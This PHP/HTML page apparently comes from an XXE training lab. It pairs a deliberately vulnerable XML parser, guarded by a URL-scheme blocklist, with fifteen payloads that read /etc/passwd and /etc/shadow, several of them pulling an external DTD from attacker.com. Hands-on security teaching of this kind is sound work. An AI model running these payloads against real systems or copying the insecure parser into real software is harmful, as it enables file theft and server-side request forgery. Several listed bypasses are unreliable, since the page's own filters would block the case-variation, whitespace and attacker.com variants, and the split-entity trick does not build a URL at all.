<?php
// Lab 4: Advanced XXE Techniques
// Vulnerability: Advanced XXE bypass techniques

session_start();

$message = '';
$xml_output = '';
$parsed_data = [];

// Simulate advanced XXE with multiple filters
function process_advanced_xxe($xml_input) {
    // Advanced security filters (can be bypassed)
    $dangerous_patterns = [
        'file://', 'http://', 'https://', 'ftp://', 'gopher://', 'ldap://', 'smb://',
        'php://', 'data://', 'expect://', 'zip://', 'compress.zlib://'
    ];
    
    // Check for dangerous patterns
    foreach ($dangerous_patterns as $pattern) {
        if (stripos($xml_input, $pattern) !== false) {
            return "Dangerous pattern detected: " . $pattern;
        }
    }
    
    // Additional checks for common bypass techniques
    if (preg_match('/<!ENTITY\s+\w+\s+SYSTEM\s+["\']([^"\']+)["\']/', $xml_input, $matches)) {
        $url = $matches[1];
        if (preg_match('/^(file|http|https|ftp|gopher|ldap|smb|php|data|expect|zip|compress\.zlib):/', $url)) {
            return "Dangerous URL scheme detected: " . $url;
        }
    }
    
    // Vulnerable: Still allows some advanced bypasses
    libxml_disable_entity_loader(false);
    
    try {
        // Vulnerable: Direct XML parsing without proper validation
        $dom = new DOMDocument();
        $dom->loadXML($xml_input, LIBXML_NOENT | LIBXML_DTDLOAD);
        
        // Extract data from XML
        $data = [];
        $root = $dom->documentElement;
        
        foreach ($root->childNodes as $node) {
            if ($node->nodeType == XML_ELEMENT_NODE) {
                $data[$node->nodeName] = $node->textContent;
            }
        }
        
        return $data;
    } catch (Exception $e) {
        return "Error parsing XML: " . $e->getMessage();
    }
}

// Handle advanced XXE
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['process_xml'])) {
    $xml_input = $_POST['xml_input'] ?? '';
    
    if ($xml_input) {
        $parsed_data = process_advanced_xxe($xml_input);
        $message = '<div class="alert alert-success">XML processed successfully!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 4: Advanced XXE Techniques - XML External Entity Injection Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .xml-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .advanced-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to XXE Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 4: Advanced XXE Techniques</h1>
            <p class="hero-subtitle">Advanced XXE bypass techniques against sophisticated filters</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates advanced XXE bypass techniques against sophisticated security filters. The application implements multiple layers of protection but can still be bypassed using advanced obfuscation and encoding techniques.</p>
            <p><strong>Objective:</strong> Use advanced techniques to bypass sophisticated filters and achieve XXE exploitation.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Advanced Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Advanced security filters (can be bypassed)
function process_advanced_xxe($xml_input) {
    $dangerous_patterns = [
        'file://', 'http://', 'https://', 'ftp://', 'gopher://', 
        'ldap://', 'smb://', 'php://', 'data://', 'expect://'
    ];
    
    // Check for dangerous patterns
    foreach ($dangerous_patterns as $pattern) {
        if (stripos($xml_input, $pattern) !== false) {
            return "Dangerous pattern detected: " . $pattern;
        }
    }
    
    // Additional regex checks
    if (preg_match('/<!ENTITY\s+\w+\s+SYSTEM\s+["\']([^"\']+)["\']/', $xml_input, $matches)) {
        $url = $matches[1];
        if (preg_match('/^(file|http|https|ftp|gopher|ldap|smb|php|data|expect):/', $url)) {
            return "Dangerous URL scheme detected: " . $url;
        }
    }
    
    // Still vulnerable to advanced bypasses
    return $data;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-bug me-2"></i>Advanced XXE Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="advanced-info">
                            <h5>Advanced Filters</h5>
                            <p>Multiple layers of protection:</p>
                            <ul>
                                <li><strong>Pattern Detection:</strong> Detects dangerous URL schemes</li>
                                <li><strong>Regex Validation:</strong> Validates entity declarations</li>
                                <li><strong>URL Scheme Filtering:</strong> Blocks common protocols</li>
                                <li><strong>Advanced Pattern Matching:</strong> Complex regex patterns</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Advanced Bypass Techniques</h5>
                            <p>Try these advanced methods:</p>
                            <ul>
                                <li><code>UTF-8 encoding</code> - Unicode bypass</li>
                                <li><code>XML parameter entities</code> - Parameter entity bypass</li>
                                <li><code>External DTD</code> - External DTD bypass</li>
                                <li><code>Obfuscation</code> - String obfuscation</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="process_xml" value="1">
                            <div class="mb-3">
                                <label for="xml_input" class="form-label">Advanced XXE Input</label>
                                <textarea class="form-control" id="xml_input" name="xml_input" 
                                          rows="8" placeholder="Enter advanced XXE payload..."><?php echo htmlspecialchars($_POST['xml_input'] ?? ''); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Process XML</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Parsed XML Data
                    </div>
                    <div class="card-body">
                        <div class="xml-display">
                            <h5>Parsed Data (May contain bypassed content):</h5>
                            <?php if (is_array($parsed_data)): ?>
                                <pre><?php print_r($parsed_data); ?></pre>
                            <?php else: ?>
                                <p><?php echo htmlspecialchars($parsed_data); ?></p>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Advanced XXE Techniques</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Advanced filters can be bypassed</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Advanced Techniques</h5>
                    <ul>
                        <li><strong>Encoding:</strong> UTF-8, Unicode, Base64</li>
                        <li><strong>Obfuscation:</strong> String manipulation</li>
                        <li><strong>Parameter Entities:</strong> %entity declarations</li>
                        <li><strong>External DTDs:</strong> Remote DTD inclusion</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Advanced XXE Bypass Payloads</h5>
            <p>Use these advanced techniques to bypass sophisticated security filters:</p>
            
            <h6>1. UTF-8 Encoding Bypass:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>2. Unicode Encoding Bypass:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x65;&#x74;&#x63;&#x2f;&#x70;&#x61;&#x73;&#x73;&#x77;&#x64;"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>3. String Concatenation Bypass:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "f"&gt;
    &lt;!ENTITY xxe2 SYSTEM "ile:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&amp;xxe2;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>4. Parameter Entity Bypass:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
    &lt;!ENTITY xxe SYSTEM "data://text/plain;base64,%file;"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>5. External DTD Bypass:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd"&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

// evil.dtd content:
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</div>

            <h6>6. Blind XXE with External DTD:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
    &lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt;
    %remote;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

// evil.dtd content:
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</div>

            <h6>7. Obfuscated URL Schemes:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x65;&#x74;&#x63;&#x2f;&#x70;&#x61;&#x73;&#x73;&#x77;&#x64;"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>8. Mixed Encoding Bypass:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "&#102;ile:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "f&#105;le:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>9. Case Variation Bypass:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "FILE:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "File:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>10. Whitespace Bypass:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM " file:///etc/passwd "&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "&#32;file:///etc/passwd&#32;"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>11. Tab and Newline Bypass:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "&#9;file:///etc/passwd&#9;"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "&#10;file:///etc/passwd&#10;"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>12. Multiple Entity Declarations:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
    &lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt;
    %remote;
    %file;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>13. Nested Entity Declarations:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
    &lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt;
    %remote;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

// evil.dtd content:
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY xxe SYSTEM "data://text/plain;base64,%file;"&gt;</div>

            <h6>14. Conditional Entity Declarations:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
    &lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt;
    %remote;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

// evil.dtd content:
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY xxe SYSTEM "data://text/plain;base64,%file;"&gt;
&lt;!ENTITY % file SYSTEM "file:///etc/shadow"&gt;</div>

            <h6>15. Advanced Obfuscation Techniques:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x65;&#x74;&#x63;&#x2f;&#x70;&#x61;&#x73;&#x73;&#x77;&#x64;"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Bypass advanced WAFs and security filters</li>
                <li>Inject malicious external entities despite protections</li>
                <li>Execute file disclosure and SSRF attacks</li>
                <li>Compromise internal systems and data</li>
                <li>Install persistent backdoors</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Disable external entity processing in XML parsers</li>
                    <li>Use whitelist-based validation for allowed XML schemas</li>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use secure XML parsing libraries</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual XML processing patterns</li>
                    <li>Implement Content Security Policy (CSP)</li>
                    <li>Use Web Application Firewall (WAF) to detect XXE attempts</li>
                    <li>Implement behavioral analysis to detect advanced attacks</li>
                    <li>Use proper file system permissions and access controls</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
